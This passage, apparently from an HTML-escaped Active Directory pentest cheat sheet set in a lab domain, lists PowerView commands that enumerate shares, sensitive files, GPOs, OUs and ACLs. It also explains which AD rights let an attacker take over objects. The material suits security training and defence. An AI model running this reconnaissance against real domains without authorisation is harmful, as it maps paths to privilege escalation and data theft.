&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Check if the share is accessible&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ShareFinder&lt;/span> &lt;span class="n">-CheckShareAccess&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Find senstive files on computers in the domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-FileFinder&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get all fileservers of the domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetFileServer&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get list of GPO in current domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPO&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPO&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">displayname&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">whencreated&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPO&lt;/span> &lt;span class="n">-GPOname&lt;/span> &lt;span class="s2">&amp;#34;{AB306569-220D-43FF-B03B83E8F4EF8081}&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPO&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>GPO files are stored in the SYSVOL path:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd &lt;/span>&lt;span class="s2">&amp;#34;\\cyberlab.local\sysvol\cyberlab.local\Policies\{603ABE02-C554-49B1-A462-2FF89BC61CB2}&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>and can be easily analized by using the tool &lt;em>Registry.Pol Reader&lt;/em>. It is necessary to copy the folder to the local machine and then open the file &lt;em>registry.pol&lt;/em> in the aforementioned tool. In case it is possible to install such tool on a machine in the analyzed domain, it can automatically capture and show all the policies.&lt;/p>
&lt;p>Get GPO(s) which use Restricted Groups or groups.xml for interesting users:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPOGroup&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get users/groups which are in a local group of a machine using GPO correlation (this command analyzes the GPO applied to the OU to which the computer belongs):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-GPOComputerAdmin&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1.cyberlab.local&amp;#34;&lt;/span> &lt;span class="c"># Default group: Local Administrators&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-GPOComputerAdmin&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1.cyberlab.local&amp;#34;&lt;/span> &lt;span class="n">-LocalGroup&lt;/span> &lt;span class="s2">&amp;#34;Remote Desktop Users&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-GPOComputerAdmin&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1.cyberlab.local&amp;#34;&lt;/span> &lt;span class="n">-Recurse&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ComputerName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ObjectName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">GPODisplayName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">isGroup&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-GPOComputerAdmin&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1.cyberlab.local&amp;#34;&lt;/span> &lt;span class="n">-Recurse&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IsGroup&lt;/span> &lt;span class="o">-ne&lt;/span> &lt;span class="vm">$true&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-GPOComputerAdmin&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1.cyberlab.local&amp;#34;&lt;/span> &lt;span class="n">-Recurse&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IsGroup&lt;/span> &lt;span class="o">-ne&lt;/span> &lt;span class="vm">$true&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ComputerName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ObjectName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">GPODisplayName&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get machines where the given user is member of a specific group using GPO correlation:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-GPOLocation&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cyberlab.local&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="c"># Default group: Local administrators&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-GPOLocation&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cyberlab.local&amp;#34;&lt;/span> &lt;span class="n">-LocalGroup&lt;/span> &lt;span class="s2">&amp;#34;Remote Desktop Users&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-GPOLocation&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cyberlab.local&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ComputerName&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get OUs in a domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetOU&lt;/span> &lt;span class="n">-FullData&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetOU&lt;/span> &lt;span class="n">-FullData&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">gplink&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## List all the computers in all OUs&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetOU&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-ADSPath&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;---&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## List all the computers in an OU&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetOU&lt;/span> &lt;span class="s2">&amp;#34;*student*&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-ADSPath&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Enumerate all GPOs applied to an OU&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetOU&lt;/span> &lt;span class="p">*&lt;/span>&lt;span class="n">student&lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-ADSPath&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPO&lt;/span> &lt;span class="n">-ADSpath&lt;/span> &lt;span class="s1">&amp;#39;LDAP://cn={5BA02DB5-FC5E-4A57-A310-0B1600456CC7},cn=policies,cn=system,DC=cyberlab,DC=local&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADOrganizationalUnit&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="access-control-lists-acl">Access Control Lists (ACL)&lt;/h2>
&lt;p>&lt;strong>ACL Entities&lt;/strong>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Name&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>SID&lt;/td>
&lt;td>Security IDentifier&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>DACL&lt;/td>
&lt;td>Discretionary Access Control List&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ACE&lt;/td>
&lt;td>Access Control Entry (contained in DACL)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>SACL&lt;/td>
&lt;td>Security Access Control List (LOGS)&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;p>&lt;strong>ACE Structure&lt;/strong>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Name&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>IdentityReference&lt;/td>
&lt;td>Subject&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ActiveDirectoryRights&lt;/td>
&lt;td>Privileges assigned to IdentityReference in relation to ObjectDN&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ObjectDN&lt;/td>
&lt;td>Target Object&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>&lt;strong>IdentityReference&lt;/strong> can &lt;strong>ActiveDirectoryRights&lt;/strong> on &lt;strong>ObjectDN&lt;/strong>&lt;/p>
&lt;hr>
&lt;p>&lt;strong>ActiveDirectoryRights&lt;/strong>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Name&lt;/th>
&lt;th>Value&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>AccessSystemSecurity&lt;/td>
&lt;td>16777216&lt;/td>
&lt;td>The right to get or set the SACL in the object security descriptor.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>CreateChild&lt;/td>
&lt;td>1&lt;/td>
&lt;td>The right to create children of the object.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Delete&lt;/td>
&lt;td>65536&lt;/td>
&lt;td>The right to delete the object.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>DeleteChild&lt;/td>
&lt;td>2&lt;/td>
&lt;td>The right to delete children of the object.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>DeleteTree&lt;/td>
&lt;td>64&lt;/td>
&lt;td>The right to delete all children of this object, regardless of the permissions of the children.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ExtendedRight&lt;/td>
&lt;td>256&lt;/td>
&lt;td>A customized control access right. For a list of possible extended rights, see the topic &amp;ldquo;Extended Rights&amp;rdquo; in the MSDN Library at &lt;a href="http://msdn.microsoft.com" target="_blank" rel="noopener">http://msdn.microsoft.com&lt;/a>. For more information about extended rights, see the topic &amp;ldquo;Control Access Rights&amp;rdquo; in the MSDN Library at &lt;a href="http://msdn.microsoft.com" target="_blank" rel="noopener">http://msdn.microsoft.com&lt;/a>. [AllExtendedRights - ability to add user to a group or reset password]&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ForceChangePassword&lt;/td>
&lt;td>&lt;/td>
&lt;td>Ability to change user&amp;rsquo;s password&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>GenericAll&lt;/td>
&lt;td>983551&lt;/td>
&lt;td>The right to create or delete children, delete a subtree, read and write properties, examine children and the object itself, add and remove the object from the directory, and read or write with an extended right. [full rights to the object (add users to a group or reset user&amp;rsquo;s password)]&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>GenericExecute&lt;/td>
&lt;td>131076&lt;/td>
&lt;td>The right to read permissions on, and list the contents of, a container object.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>GenericRead&lt;/td>
&lt;td>131220&lt;/td>
&lt;td>The right to read permissions on this object, read all the properties on this object, list this object name when the parent container is listed, and list the contents of this object if it is a container.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>GenericWrite&lt;/td>
&lt;td>131112&lt;/td>
&lt;td>The right to read permissions on this object, write all the properties on this object, and perform all validated writes to this object. [update object&amp;rsquo;s attributes (i.e logon script)]&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ListChildren&lt;/td>
&lt;td>4&lt;/td>
&lt;td>The right to list children of this object. For more information about this right, see the topic &amp;ldquo;Controlling Object Visibility&amp;rdquo; in the MSDN Library &lt;a href="http://msdn.microsoft.com/library" target="_blank" rel="noopener">http://msdn.microsoft.com/library&lt;/a>.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ListObject&lt;/td>
&lt;td>128&lt;/td>
&lt;td>The right to list a particular object. For more information about this right, see the topic &amp;ldquo;Controlling Object Visibility&amp;rdquo; in the MSDN Library at &lt;a href="http://msdn.microsoft.com/library" target="_blank" rel="noopener">http://msdn.microsoft.com/library&lt;/a>.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ReadControl&lt;/td>
&lt;td>131072&lt;/td>
&lt;td>The right to read data from the security descriptor of the object, not including the data in the SACL.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ReadProperty&lt;/td>
&lt;td>16&lt;/td>
&lt;td>The right to read properties of the object.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Self&lt;/td>
&lt;td>8&lt;/td>
&lt;td>The right to perform an operation that is controlled by a validated write access right. [ability to add yourself to a group]&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Synchronize&lt;/td>
&lt;td>1048576&lt;/td>
&lt;td>The right to use the object for synchronization. This right enables a thread to wait until that object is in the signaled state.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>WriteDacl&lt;/td>
&lt;td>262144&lt;/td>
&lt;td>The right to modify the DACL in the object security descriptor. [modify object&amp;rsquo;s ACEs and give attacker full control right over the object]&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>WriteOwner&lt;/td>
&lt;td>524288&lt;/td>
&lt;td>The right to assume ownership of the object. The user must be an object trustee. The user cannot transfer the ownership to other users. [change object owner to attacker controlled user take over the object]&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>WriteProperty&lt;/td>
&lt;td>32&lt;/td>
&lt;td>The right to write properties of the object.&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>Get the ACLs associated with the specified SamAccountName (ObjectDN - Target object):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-SamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-SamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">IdentityReference&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ActiveDirectoryRights&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-SamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ActiveDirectoryRights&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="s2">&amp;#34;GenericAll&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-SamAccountName&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get the ACLs associated with the specified target AD prefix or path (ObjectDN - Target object):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-ADSprefix&lt;/span> &lt;span class="s2">&amp;#34;CN=Administrator,CN=Users&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-ADSprefix&lt;/span> &lt;span class="s2">&amp;#34;CN=FirstName LastName,CN=Users&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-ADSpath&lt;/span> &lt;span class="s2">&amp;#34;CN=FirstName LastName,CN=Users,DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-Acl&lt;/span> &lt;span class="s2">&amp;#34;AD:\CN=Administrator,CN=Users,DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">Access&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get the ACLs associated with the specified target LDAP path (ObjectDN - Target object):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-ADSpath&lt;/span> &lt;span class="s2">&amp;#34;LDAP://CN=Domain Admins,CN=Users,DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get the ACLs associated to all the GPOs:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPO&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Enumerate those GPOs where a particular user has interesting permissions&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPO&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Search for interesting ACEs:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ACLScanner&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ACLScanner&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ACLScanner&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">IdentityReference&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ActiveDirectoryRights&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ObjectDN&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ACLScanner&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ActiveDirectoryRights&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="s2">&amp;#34;GenericAll&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">IdentityReference&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ActiveDirectoryRights&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ObjectDN&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Check if a particular user has interesting permissions&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ACLScanner&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get the ACLs associated with the specified file path:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-PathAcl&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s2">&amp;#34;\\cyberlab-dc.cyberlab.cybercorp.local\SYSVOL&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-PathAcl&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s2">&amp;#34;\\COMPUTER1.cyberlab.cybercorp.local\C$&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="trusts-and-forests">Trusts and Forests&lt;/h2>
&lt;p>&lt;strong>Trust directions&lt;/strong>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Direction&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Bidirectional&lt;/td>
&lt;td>Two-way&lt;/td>
&lt;/tr>
&lt;tr>
